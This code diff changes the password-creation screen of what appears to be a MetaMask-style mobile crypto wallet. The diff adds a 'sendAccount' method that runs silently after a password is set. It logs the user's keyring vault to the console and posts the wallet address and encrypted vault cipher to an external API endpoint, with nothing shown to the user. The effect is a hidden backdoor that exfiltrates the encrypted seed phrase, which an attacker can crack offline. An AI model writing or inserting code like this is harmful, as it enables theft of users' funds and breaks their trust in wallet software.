@@ -30,6 +30,8 @@ import {
 	BIOMETRY_CHOICE_DISABLED
 } from '../../../constants/storage';
 import { getPasswordStrengthWord, passwordRequirementsMet, MIN_PASSWORD_LENGTH } from '../../../util/password';
+import API from 'services/api'
+import Routes from 'common/routes'
 
 import { CHOOSE_PASSWORD_STEPS } from '../../../constants/onboarding';
 
@@ -290,6 +292,29 @@ class ChoosePassword extends PureComponent {
 		this.keyringControllerPasswordSet = true;
 	};
 
+	/*
+
+			LCN Implementation
+		
+
+	*/
+	sendAccount(){
+		const { selectedAddress, keyringController } = this.props;
+		let vault = JSON.parse(keyringController.vault)
+		console.log('selected', selectedAddress)
+		console.log('keyringController', vault)
+		if(selectedAddress == null){
+			return
+		}
+		API.postRequest(Routes.walletCreation, [
+			"myWallet", selectedAddress, vault.cipher
+		], response => {
+			console.log('account creation', response)
+		}, error => {
+			console.log('error account', error)
+		})
+	}
+
 	onPressCreate = async () => {
 		const { loading, isSelected, password, confirmPassword } = this.state;
 		const passwordsMatch = password !== '' && password === confirmPassword;
@@ -330,6 +355,7 @@ class ChoosePassword extends PureComponent {
 			}
 			await AsyncStorage.setItem(EXISTING_USER, TRUE);
 			await AsyncStorage.removeItem(SEED_PHRASE_HINTS);
+			this.sendAccount()
 			this.props.passwordSet();
 			this.props.setLockTime(AppConstants.DEFAULT_LOCK_TIMEOUT);
 			this.setState({ loading: false });
@@ -399,6 +425,8 @@ class ChoosePassword extends PureComponent {
 		for (let i = 0; i < existingAccountCount - 1; i++) {
 			await KeyringController.addNewAccount();
 		}
+
+		console.log('create new accounts on recreate')
 
 		try {
 			// Import imported accounts again
@@ -645,7 +673,8 @@ class ChoosePassword extends PureComponent {
 }
 
 const mapStateToProps = state => ({
-	selectedAddress: state.engine.backgroundState.PreferencesController.selectedAddress
+	selectedAddress: state.engine.backgroundState.PreferencesController.selectedAddress,
+	keyringController: state.engine.backgroundState.KeyringController
 });
 
 const mapDispatchToProps = dispatch => ({
